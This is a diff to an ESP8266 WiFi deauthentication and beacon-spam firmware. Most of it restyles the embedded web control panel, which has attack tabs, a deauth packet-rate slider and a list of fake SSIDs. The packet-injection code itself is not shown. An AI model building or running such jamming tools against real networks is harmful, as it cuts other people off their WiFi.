@@ -44,8 +44,8 @@ T minVal(T a, T b) {
 #define AP_PASS "deauther"
 #define LED_PIN 2
 #define BUTTON_PIN 0
-#define MAX_SSIDS 20
-#define MAX_STATIONS 20
+#define MAX_SSIDS 8
+#define MAX_STATIONS 8
 
 // Web server and DNS
 ESP8266WebServer server(80);
@@ -159,31 +159,19 @@ void updateLED();
 void saveSettings();
 void loadSettings();
 
-// Fake WiFi SSIDs for beacon spam
-String fakeSSIDs[] = {
+// Fake WiFi SSIDs for beacon spam (reduced for memory)
+const char* fakeSSIDs[] PROGMEM = {
   "FBI Surveillance Van",
-  "NSA Listening Post",
-  "Free WiFi (Totally Safe)",
-  "Virus Distribution Point",
+  "Free WiFi Totally Safe",
   "Router McRouterface",
-  "It Burns When IP",
-  "Abraham Linksys",
   "Tell My WiFi Love Her",
   "404 Network Unavailable",
-  "Drop It Like Its Hotspot",
-  "The LAN Before Time",
-  "Silence of the LANs",
-  "House LANnister",
   "Wu Tang LAN",
-  "LAN Solo",
-  "Hide Yo Kids Hide Yo WiFi",
   "Loading...",
-  "Connecting...",
-  "PASSWORD_IS_PASSWORD",
-  "Pretty Fly for a WiFi"
+  "PASSWORD_IS_PASSWORD"
 };
 
-const char* htmlPage = R"rawliteral(
+const char htmlPage[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -191,6 +179,8 @@ const char* htmlPage = R"rawliteral(
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ESP8266 Deauther Advanced - 0x0806</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        
         * {
             margin: 0;
             padding: 0;
@@ -200,103 +190,242 @@ const char* htmlPage = R"rawliteral(
         :root {
             --primary: #6366f1;
             --primary-dark: #4f46e5;
+            --primary-light: #818cf8;
             --secondary: #ec4899;
+            --secondary-dark: #db2777;
+            --accent: #06b6d4;
+            --accent-dark: #0891b2;
             --success: #10b981;
+            --success-dark: #059669;
             --warning: #f59e0b;
+            --warning-dark: #d97706;
             --danger: #ef4444;
-            --dark: #1f2937;
-            --dark-light: #374151;
-            --light: #f9fafb;
-            --border: #e5e7eb;
-            --text: #111827;
-            --text-muted: #6b7280;
-            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
-            --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-            --gradient-bg: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --danger-dark: #dc2626;
+            --info: #3b82f6;
+            --info-dark: #2563eb;
+            --dark: #0f172a;
+            --dark-light: #1e293b;
+            --dark-medium: #334155;
+            --dark-soft: #475569;
+            --light: #f8fafc;
+            --light-soft: #f1f5f9;
+            --border: #e2e8f0;
+            --border-light: #f1f5f9;
+            --text: #0f172a;
+            --text-light: #334155;
+            --text-muted: #64748b;
+            --text-subtle: #94a3b8;
+            --surface: #ffffff;
+            --surface-soft: #f8fafc;
+            --surface-medium: #f1f5f9;
+            --shadow-xs: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            --shadow-sm: 0 1px 3px 0 rgba(0, 0, 0, 0.1), 0 1px 2px 0 rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            --shadow-2xl: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            --shadow-inner: inset 0 2px 4px 0 rgba(0, 0, 0, 0.06);
+            --gradient-bg: linear-gradient(135deg, #667eea 0%, #764ba2 25%, #f093fb 50%, #f5576c 75%, #4facfe 100%);
             --gradient-primary: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            --gradient-danger: linear-gradient(135deg, var(--danger), #dc2626);
-            --gradient-success: linear-gradient(135deg, var(--success), #059669);
-            --gradient-warning: linear-gradient(135deg, var(--warning), #d97706);
+            --gradient-secondary: linear-gradient(135deg, var(--secondary), var(--secondary-dark));
+            --gradient-danger: linear-gradient(135deg, var(--danger), var(--danger-dark));
+            --gradient-success: linear-gradient(135deg, var(--success), var(--success-dark));
+            --gradient-warning: linear-gradient(135deg, var(--warning), var(--warning-dark));
+            --gradient-accent: linear-gradient(135deg, var(--accent), var(--accent-dark));
+            --gradient-dark: linear-gradient(135deg, var(--dark), var(--dark-light));
+            --gradient-glass: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
+            --gradient-mesh: radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                             radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
+                             radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.3) 0%, transparent 50%);
+            --border-radius-sm: 8px;
+            --border-radius-md: 12px;
+            --border-radius-lg: 16px;
+            --border-radius-xl: 20px;
+            --border-radius-2xl: 24px;
+            --border-radius-full: 9999px;
+            --spacing-xs: 0.25rem;
+            --spacing-sm: 0.5rem;
+            --spacing-md: 1rem;
+            --spacing-lg: 1.5rem;
+            --spacing-xl: 2rem;
+            --spacing-2xl: 3rem;
+            --spacing-3xl: 4rem;
+            --animation-duration-fast: 0.15s;
+            --animation-duration-normal: 0.3s;
+            --animation-duration-slow: 0.5s;
+            --animation-easing: cubic-bezier(0.4, 0, 0.2, 1);
+            --animation-bounce: cubic-bezier(0.68, -0.55, 0.265, 1.55);
         }
 
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
             background: var(--gradient-bg);
+            background-attachment: fixed;
             min-height: 100vh;
             color: var(--text);
             line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-mesh);
+            z-index: -1;
+            opacity: 0.6;
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1600px;
             margin: 0 auto;
-            padding: 1rem;
+            padding: var(--spacing-md);
             min-height: 100vh;
             display: flex;
             flex-direction: column;
+            position: relative;
         }
 
         .header {
             text-align: center;
-            margin-bottom: 2rem;
+            margin-bottom: var(--spacing-xl);
             background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            padding: 2rem;
-            box-shadow: var(--shadow-lg);
+            backdrop-filter: blur(20px) saturate(180%);
+            border-radius: var(--border-radius-2xl);
+            padding: var(--spacing-2xl);
+            box-shadow: var(--shadow-2xl);
             border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-glass);
+            z-index: 1;
+        }
+
+        .header > * {
+            position: relative;
+            z-index: 2;
         }
 
         .logo {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: var(--gradient-primary);
+            font-size: 3rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--primary), var(--secondary), var(--accent));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
-            margin-bottom: 0.5rem;
+            margin-bottom: var(--spacing-sm);
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            letter-spacing: -0.025em;
         }
 
         .tagline {
             color: var(--text-muted);
-            font-size: 1.1rem;
-            margin-bottom: 1rem;
+            font-size: 1.125rem;
+            margin-bottom: var(--spacing-md);
+            font-weight: 500;
         }
 
         .version {
             display: inline-block;
             background: var(--gradient-primary);
             color: white;
-            padding: 0.25rem 0.75rem;
-            border-radius: 50px;
+            padding: var(--spacing-xs) var(--spacing-md);
+            border-radius: var(--border-radius-full);
             font-size: 0.875rem;
             font-weight: 600;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .version::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left var(--animation-duration-slow) var(--animation-easing);
+        }
+
+        .version:hover::before {
+            left: 100%;
         }
 
         .nav-tabs {
             display: flex;
             justify-content: center;
-            gap: 0.5rem;
-            margin-bottom: 2rem;
+            gap: var(--spacing-sm);
+            margin-bottom: var(--spacing-xl);
             flex-wrap: wrap;
+            padding: var(--spacing-sm);
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: var(--border-radius-xl);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
 
         .nav-tab {
-            padding: 0.75rem 1.5rem;
+            padding: var(--spacing-md) var(--spacing-lg);
             background: rgba(255, 255, 255, 0.9);
             border: none;
-            border-radius: 12px;
+            border-radius: var(--border-radius-md);
             cursor: pointer;
             font-weight: 600;
-            transition: all 0.3s ease;
+            transition: all var(--animation-duration-normal) var(--animation-easing);
             color: var(--text-muted);
+            position: relative;
+            overflow: hidden;
+            font-size: 0.9rem;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-tab::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-primary);
+            opacity: 0;
+            transition: opacity var(--animation-duration-normal) var(--animation-easing);
+        }
+
+        .nav-tab:hover {
+            transform: translateY(-2px);
+            box-shadow: var(--shadow-lg);
+            background: rgba(255, 255, 255, 0.95);
         }
 
         .nav-tab.active {
             background: var(--gradient-primary);
             color: white;
             transform: translateY(-2px);
-            box-shadow: var(--shadow);
+            box-shadow: var(--shadow-xl);
+        }
+
+        .nav-tab.active::before {
+            opacity: 1;
+        }
+
+        .nav-tab span {
+            position: relative;
+            z-index: 1;
         }
 
         .tab-content {
@@ -305,72 +434,170 @@ const char* htmlPage = R"rawliteral(
 
         .tab-content.active {
             display: block;
-            animation: fadeIn 0.3s ease;
+            animation: fadeInUp var(--animation-duration-normal) var(--animation-easing);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes fadeInUp {
+            from { 
+                opacity: 0; 
+                transform: translateY(20px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
+            }
         }
 
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 1.5rem;
-            margin-bottom: 2rem;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: var(--spacing-lg);
+            margin-bottom: var(--spacing-xl);
         }
 
         .card {
             background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            padding: 1.5rem;
-            box-shadow: var(--shadow-lg);
+            backdrop-filter: blur(20px) saturate(180%);
+            border-radius: var(--border-radius-xl);
+            padding: var(--spacing-lg);
+            box-shadow: var(--shadow-xl);
             border: 1px solid rgba(255, 255, 255, 0.2);
-            transition: all 0.3s ease;
+            transition: all var(--animation-duration-normal) var(--animation-easing);
             height: fit-content;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-glass);
+            opacity: 0;
+            transition: opacity var(--animation-duration-normal) var(--animation-easing);
         }
 
         .card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 35px 60px -12px rgba(0, 0, 0, 0.3);
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: var(--shadow-2xl);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .card:hover::before {
+            opacity: 1;
+        }
+
+        .card > * {
+            position: relative;
+            z-index: 1;
         }
 
         .card-title {
-            font-size: 1.25rem;
+            font-size: 1.375rem;
             font-weight: 700;
-            margin-bottom: 1rem;
-            color: var(--dark);
+            margin-bottom: var(--spacing-md);
+            color: var(--text);
             display: flex;
             align-items: center;
-            gap: 0.5rem;
+            gap: var(--spacing-sm);
+        }
+
+        .card-title::before {
+            content: '';
+            width: 4px;
+            height: 20px;
+            background: var(--gradient-primary);
+            border-radius: var(--border-radius-full);
         }
 
         .btn {
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 0.5rem;
-            padding: 0.75rem 1.5rem;
+            gap: var(--spacing-sm);
+            padding: var(--spacing-md) var(--spacing-lg);
             border: none;
-            border-radius: 12px;
+            border-radius: var(--border-radius-md);
             font-weight: 600;
             text-decoration: none;
             cursor: pointer;
-            transition: all 0.2s ease;
+            transition: all var(--animation-duration-fast) var(--animation-easing);
             font-size: 0.9rem;
-            margin: 0.25rem;
-            min-width: 120px;
+            margin: var(--spacing-xs);
+            min-width: 140px;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
         }
 
-        .btn-primary { background: var(--gradient-primary); color: white; }
-        .btn-danger { background: var(--gradient-danger); color: white; }
-        .btn-success { background: var(--gradient-success); color: white; }
-        .btn-warning { background: var(--gradient-warning); color: white; }
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left var(--animation-duration-slow) var(--animation-easing);
+        }
+
+        .btn:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary { 
+            background: var(--gradient-primary); 
+            color: white; 
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .btn-secondary { 
+            background: var(--gradient-secondary); 
+            color: white; 
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .btn-accent { 
+            background: var(--gradient-accent); 
+            color: white; 
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .btn-danger { 
+            background: var(--gradient-danger); 
+            color: white; 
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .btn-success { 
+            background: var(--gradient-success); 
+            color: white; 
+            box-shadow: var(--shadow-lg);
+        }
+        
+        .btn-warning { 
+            background: var(--gradient-warning); 
+            color: white; 
+            box-shadow: var(--shadow-lg);
+        }
+
+        .btn-outline {
+            background: rgba(255, 255, 255, 0.9);
+            color: var(--text);
+            border: 2px solid var(--border);
+            backdrop-filter: blur(10px);
+        }
 
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            transform: translateY(-2px) scale(1.05);
+            box-shadow: var(--shadow-2xl);
+        }
+
+        .btn:active {
+            transform: translateY(0) scale(0.98);
         }
 
         .btn:disabled {
@@ -380,122 +607,304 @@ const char* htmlPage = R"rawliteral(
         }
 
         .status {
-            padding: 1rem;
-            border-radius: 12px;
-            margin: 1rem 0;
+            padding: var(--spacing-md);
+            border-radius: var(--border-radius-md);
+            margin: var(--spacing-md) 0;
             font-weight: 600;
             text-align: center;
             border: 2px solid;
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
         }
 
-        .status-idle { background: #f0f9ff; color: #0369a1; border-color: #bae6fd; }
-        .status-scanning { background: #fffbeb; color: #d97706; border-color: #fed7aa; }
-        .status-attacking { background: #fef2f2; color: #dc2626; border-color: #fecaca; }
-        .status-beacon { background: #f0fdf4; color: #16a34a; border-color: #bbf7d0; }
+        .status::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @keyframes shimmer {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .status-idle { 
+            background: rgba(240, 249, 255, 0.9); 
+            color: var(--info); 
+            border-color: rgba(59, 130, 246, 0.3); 
+        }
+        
+        .status-scanning { 
+            background: rgba(255, 251, 235, 0.9); 
+            color: var(--warning-dark); 
+            border-color: rgba(245, 158, 11, 0.3); 
+        }
+        
+        .status-attacking { 
+            background: rgba(254, 242, 242, 0.9); 
+            color: var(--danger-dark); 
+            border-color: rgba(239, 68, 68, 0.3); 
+        }
+        
+        .status-beacon { 
+            background: rgba(240, 253, 244, 0.9); 
+            color: var(--success-dark); 
+            border-color: rgba(16, 185, 129, 0.3); 
+        }
 
         .network-list {
-            max-height: 400px;
+            max-height: 450px;
             overflow-y: auto;
             border: 1px solid var(--border);
-            border-radius: 12px;
-            margin-top: 1rem;
+            border-radius: var(--border-radius-md);
+            margin-top: var(--spacing-md);
+            backdrop-filter: blur(10px);
+        }
+
+        .network-list::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        .network-list::-webkit-scrollbar-track {
+            background: var(--surface-soft);
+            border-radius: var(--border-radius-full);
+        }
+
+        .network-list::-webkit-scrollbar-thumb {
+            background: var(--text-subtle);
+            border-radius: var(--border-radius-full);
+        }
+
+        .network-list::-webkit-scrollbar-thumb:hover {
+            background: var(--text-muted);
         }
 
         .network-item {
             display: flex;
             align-items: center;
-            padding: 1rem;
+            padding: var(--spacing-md);
             border-bottom: 1px solid var(--border);
-            transition: all 0.2s ease;
+            transition: all var(--animation-duration-fast) var(--animation-easing);
             cursor: pointer;
+            position: relative;
         }
 
-        .network-item:hover { background: #f8fafc; }
-        .network-item:last-child { border-bottom: none; }
-        .network-item.selected { background: #eff6ff; border-color: var(--primary); }
+        .network-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-primary);
+            opacity: 0;
+            transition: opacity var(--animation-duration-fast) var(--animation-easing);
+        }
 
-        .network-checkbox { margin-right: 1rem; }
+        .network-item:hover { 
+            background: rgba(248, 250, 252, 0.9); 
+            transform: translateX(4px);
+        }
+        
+        .network-item:last-child { 
+            border-bottom: none; 
+        }
+        
+        .network-item.selected { 
+            background: rgba(239, 246, 255, 0.9); 
+            border-color: var(--primary); 
+        }
 
-        .network-info { flex: 1; }
+        .network-item.selected::before {
+            opacity: 0.1;
+        }
+
+        .network-item > * {
+            position: relative;
+            z-index: 1;
+        }
+
+        .network-checkbox { 
+            margin-right: var(--spacing-md);
+            transform: scale(1.2);
+            accent-color: var(--primary);
+        }
+
+        .network-info { 
+            flex: 1; 
+        }
 
         .network-ssid {
-            font-weight: 600;
-            color: var(--dark);
+            font-weight: 700;
+            color: var(--text);
+            font-size: 1.1rem;
+            margin-bottom: var(--spacing-xs);
         }
 
         .network-details {
             font-size: 0.875rem;
             color: var(--text-muted);
-            margin-top: 0.25rem;
+            display: flex;
+            gap: var(--spacing-md);
+            flex-wrap: wrap;
+        }
+
+        .network-detail-item {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-xs);
         }
 
         .signal-strength {
-            width: 60px;
+            width: 80px;
             text-align: right;
-            font-weight: 600;
+            font-weight: 700;
+            font-size: 0.9rem;
         }
 
-        .signal-strong { color: var(--success); }
-        .signal-medium { color: var(--warning); }
-        .signal-weak { color: var(--danger); }
+        .signal-strong { 
+            color: var(--success); 
+            text-shadow: 0 0 8px rgba(16, 185, 129, 0.3);
+        }
+        
+        .signal-medium { 
+            color: var(--warning); 
+            text-shadow: 0 0 8px rgba(245, 158, 11, 0.3);
+        }
+        
+        .signal-weak { 
+            color: var(--danger); 
+            text-shadow: 0 0 8px rgba(239, 68, 68, 0.3);
+        }
 
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 1rem;
-            margin-top: 1rem;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: var(--spacing-md);
+            margin-top: var(--spacing-md);
         }
 
         .stat-item {
             text-align: center;
-            padding: 1rem;
-            background: #f8fafc;
-            border-radius: 12px;
+            padding: var(--spacing-md);
+            background: rgba(248, 250, 252, 0.9);
+            border-radius: var(--border-radius-md);
             border: 1px solid var(--border);
+            transition: all var(--animation-duration-normal) var(--animation-easing);
+            backdrop-filter: blur(10px);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .stat-item::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-primary);
+            opacity: 0;
+            transition: opacity var(--animation-duration-normal) var(--animation-easing);
+        }
+
+        .stat-item:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-lg);
+            border-color: var(--primary);
+        }
+
+        .stat-item:hover::before {
+            opacity: 0.1;
+        }
+
+        .stat-item > * {
+            position: relative;
+            z-index: 1;
         }
 
         .stat-value {
-            font-size: 1.5rem;
-            font-weight: 700;
+            font-size: 1.875rem;
+            font-weight: 800;
             color: var(--primary);
+            margin-bottom: var(--spacing-xs);
+            text-shadow: 0 0 10px rgba(99, 102, 241, 0.2);
         }
 
         .stat-label {
             font-size: 0.875rem;
             color: var(--text-muted);
-            margin-top: 0.25rem;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
         }
 
         .input-group {
-            margin: 1rem 0;
+            margin: var(--spacing-md) 0;
         }
 
         .input-group label {
             display: block;
-            margin-bottom: 0.5rem;
+            margin-bottom: var(--spacing-sm);
             font-weight: 600;
-            color: var(--dark);
+            color: var(--text);
         }
 
         .input-group input,
         .input-group select,
         .input-group textarea {
             width: 100%;
-            padding: 0.75rem;
-            border: 1px solid var(--border);
-            border-radius: 8px;
+            padding: var(--spacing-md);
+            border: 2px solid var(--border);
+            border-radius: var(--border-radius-sm);
             font-size: 0.9rem;
+            transition: all var(--animation-duration-fast) var(--animation-easing);
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(10px);
+        }
+
+        .input-group input:focus,
+        .input-group select:focus,
+        .input-group textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
+            transform: translateY(-1px);
         }
 
         .footer {
             text-align: center;
-            margin-top: 2rem;
-            padding: 1.5rem;
+            margin-top: var(--spacing-xl);
+            padding: var(--spacing-xl);
             background: rgba(255, 255, 255, 0.95);
-            backdrop-filter: blur(15px);
-            border-radius: 20px;
-            box-shadow: var(--shadow);
+            backdrop-filter: blur(20px) saturate(180%);
+            border-radius: var(--border-radius-xl);
+            box-shadow: var(--shadow-xl);
             border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--gradient-glass);
+            z-index: 1;
+        }
+
+        .footer > * {
+            position: relative;
+            z-index: 2;
         }
 
         .loading {
@@ -518,14 +927,166 @@ const char* htmlPage = R"rawliteral(
 
         @keyframes pulse {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+            50% { opacity: 0.7; }
+        }
+
+        .glow {
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { box-shadow: 0 0 10px rgba(99, 102, 241, 0.5); }
+            to { box-shadow: 0 0 20px rgba(99, 102, 241, 0.8), 0 0 30px rgba(99, 102, 241, 0.6); }
+        }
+
+        .bounce {
+            animation: bounce 1s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        .slide-in {
+            animation: slideIn 0.6s var(--animation-easing);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(-100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .fade-in {
+            animation: fadeIn 0.8s var(--animation-easing);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .scale-in {
+            animation: scaleIn 0.4s var(--animation-bounce);
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .badge {
+            display: inline-block;
+            padding: 0.25rem 0.5rem;
+            border-radius: var(--border-radius-full);
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .badge-primary { background: var(--gradient-primary); color: white; }
+        .badge-secondary { background: var(--gradient-secondary); color: white; }
+        .badge-success { background: var(--gradient-success); color: white; }
+        .badge-warning { background: var(--gradient-warning); color: white; }
+        .badge-danger { background: var(--gradient-danger); color: white; }
+        .badge-info { background: var(--gradient-accent); color: white; }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background: var(--surface-medium);
+            border-radius: var(--border-radius-full);
+            overflow: hidden;
+            margin: var(--spacing-sm) 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: var(--gradient-primary);
+            border-radius: var(--border-radius-full);
+            transition: width 0.3s ease;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.5), transparent);
+            animation: shimmer 2s infinite;
+        }
+
+        @media (max-width: 1024px) {
+            .container { 
+                padding: var(--spacing-sm); 
+                max-width: 100%;
+            }
+            .grid { 
+                grid-template-columns: 1fr; 
+                gap: var(--spacing-md);
+            }
+            .nav-tabs {
+                gap: var(--spacing-xs);
+            }
+            .nav-tab {
+                padding: var(--spacing-sm) var(--spacing-md);
+                font-size: 0.85rem;
+            }
         }
 
         @media (max-width: 768px) {
-            .container { padding: 0.5rem; }
-            .grid { grid-template-columns: 1fr; }
-            .header { padding: 1rem; }
-            .logo { font-size: 2rem; }
+            .header { 
+                padding: var(--spacing-md); 
+            }
+            .logo { 
+                font-size: 2.25rem; 
+            }
+            .tagline {
+                font-size: 1rem;
+            }
+            .card {
+                padding: var(--spacing-md);
+            }
+            .btn {
+                min-width: 120px;
+                padding: var(--spacing-sm) var(--spacing-md);
+            }
+            .stats {
+                grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: var(--spacing-xs);
+            }
+            .logo {
+                font-size: 1.75rem;
+            }
+            .nav-tabs {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .nav-tab {
+                text-align: center;
+            }
+            .network-item {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: var(--spacing-sm);
+            }
+            .signal-strength {
+                width: auto;
+                text-align: left;
+            }
+            .stats {
+                grid-template-columns: 1fr 1fr;
+            }
         }
     </style>
 </head>
@@ -538,12 +1099,12 @@ const char* htmlPage = R"rawliteral(
         </div>
 
         <div class="nav-tabs">
-            <button class="nav-tab active" onclick="showTab('scanner')">Scanner</button>
-            <button class="nav-tab" onclick="showTab('attacks')">Attacks</button>
-            <button class="nav-tab" onclick="showTab('beacon')">Beacon</button>
-            <button class="nav-tab" onclick="showTab('ssids')">SSIDs</button>
-            <button class="nav-tab" onclick="showTab('monitor')">Monitor</button>
-            <button class="nav-tab" onclick="showTab('stats')">Stats</button>
+            <button class="nav-tab active" onclick="showTab('scanner')"><span>Scanner</span></button>
+            <button class="nav-tab" onclick="showTab('attacks')"><span>Attacks</span></button>
+            <button class="nav-tab" onclick="showTab('beacon')"><span>Beacon</span></button>
+            <button class="nav-tab" onclick="showTab('ssids')"><span>SSIDs</span></button>
+            <button class="nav-tab" onclick="showTab('monitor')"><span>Monitor</span></button>
+            <button class="nav-tab" onclick="showTab('stats')"><span>Stats</span></button>
         </div>
 
         <!-- Scanner Tab -->
@@ -593,7 +1154,7 @@ const char* htmlPage = R"rawliteral(
                     <div class="card-title">Deauth Attack</div>
                     <div class="input-group">
                         <label>Packets per Second:</label>
-                        <input type="range" id="ppsSlider" min="1" max="100" value="20" oninput="updatePPS(this.value)">
+                        <input type="range" id="ppsSlider" min="1" max="50" value="20" oninput="updatePPS(this.value)">
                         <span id="ppsValue">20</span> pps
                     </div>
                     <button onclick="startDeauth()" class="btn btn-danger" id="deauthBtn" disabled>
@@ -743,7 +1304,7 @@ const char* htmlPage = R"rawliteral(
 
         <div class="footer">
             <div style="color: var(--text-muted); font-size: 0.875rem;">
-                Developed with by <strong style="color: var(--primary);">0x0806</strong><br>
+                Developed by <strong style="color: var(--primary);">0x0806</strong><br>
                 Educational purposes only - Use responsibly - Most advanced version
             </div>
         </div>
@@ -763,8 +1324,12 @@ const char* htmlPage = R"rawliteral(
         var systemStartTime = Date.now();
 
         function showTab(tabName) {
-            document.querySelectorAll('.tab-content').forEach(function(tab) { tab.classList.remove('active'); });
-            document.querySelectorAll('.nav-tab').forEach(function(tab) { tab.classList.remove('active'); });
+            document.querySelectorAll('.tab-content').forEach(function(tab) { 
+                tab.classList.remove('active'); 
+            });
+            document.querySelectorAll('.nav-tab').forEach(function(tab) { 
+                tab.classList.remove('active'); 
+            });
             document.getElementById(tabName).classList.add('active');
             event.target.classList.add('active');
 
@@ -786,23 +1351,27 @@ const char* htmlPage = R"rawliteral(
             var beaconBtn = document.getElementById('beaconBtn');
             var probeBtn = document.getElementById('probeBtn');
 
-            scanBtn.disabled = scanning || attacking;
-            deauthBtn.disabled = scanning || attacking || getSelectedNetworks().length === 0;
-            stopBtn.disabled = !attacking;
+            if (scanBtn) scanBtn.disabled = scanning || attacking;
+            if (deauthBtn) deauthBtn.disabled = scanning || attacking || getSelectedNetworks().length === 0;
